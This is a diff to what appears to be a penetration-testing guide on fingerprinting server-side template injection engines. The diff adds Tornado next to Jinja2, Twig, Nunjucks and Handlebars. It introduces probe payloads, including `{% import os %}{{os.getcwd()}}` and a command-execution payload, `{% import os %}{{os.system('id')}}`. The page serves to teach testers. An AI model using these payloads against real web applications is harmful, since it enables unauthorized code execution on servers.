@@ -66,16 +66,26 @@ A few patterns look like SSTI hits but aren't:
 Once `{{7*7}}` or `${7*7}` evaluates, narrow to a specific engine. Run probes in order; first divergence wins.
 
 <Tabs>
-  <TabItem label="`{{...}}` family - Jinja2 vs Twig vs Nunjucks vs Handlebars">
+  <TabItem label="`{{...}}` family - Jinja2 vs Tornado vs Twig vs Nunjucks vs Handlebars">
 
 ```
 {{7*'7'}}
 ```
 
 - Jinja2 (Python) → `7777777` - string-multiply semantics
+- Tornado (Python) → `7777777` - same string-multiply semantics as Jinja2
 - Twig (PHP) → `49` - numeric coercion
 - Nunjucks (Node) → `49` - numeric coercion
 - Handlebars (Node) → error or unchanged - Handlebars doesn't do arithmetic
+
+The two Python engines (Jinja2, Tornado) are indistinguishable on `{{7*'7'}}`. Split them with a Python `import` - Tornado's `{% import %}` imports modules, Jinja2's imports templates and throws on a module name:
+
+```
+{% import os %}{{os.getcwd()}}
+```
+
+- Tornado → a filesystem path (the working directory)
+- Jinja2 → error (`{% import %}` expects a template, not `os`)
 
 Then to split Twig vs Nunjucks (both returned `49`):
 
@@ -89,10 +99,13 @@ Then to split Twig vs Nunjucks (both returned `49`):
 Or the surest tell - try a constructor expression:
 
 ```
-{{ "".__class__ }}                # Jinja2: <class 'str'>
+{{ "".__class__ }}                # Python family (Jinja2 OR Tornado): <class 'str'>
 {{ _self }}                       # Twig: object dump of __TwigTemplate_...
 {{ range }}                       # Nunjucks: [object Function]
+{{ handler }}                     # Tornado: RequestHandler object (when sink is a handler)
 ```
+
+A frequent dead-end worth recognizing: `{{7*7}}` and `{{7*'7'}}` both evaluate (Python family), but every Jinja2-specific payload (`{{config}}`, `{{self}}`, the `__class__` walk) returns `500`. That is the Tornado signature - stop trying Jinja2 payloads and switch to `{% import os %}{{os.system('id')}}`. See [Tornado](/codex/web/server-side/ssti/tornado/).
 
   </TabItem>
   <TabItem label="`${...}` family - Freemarker vs Velocity vs Thymeleaf">
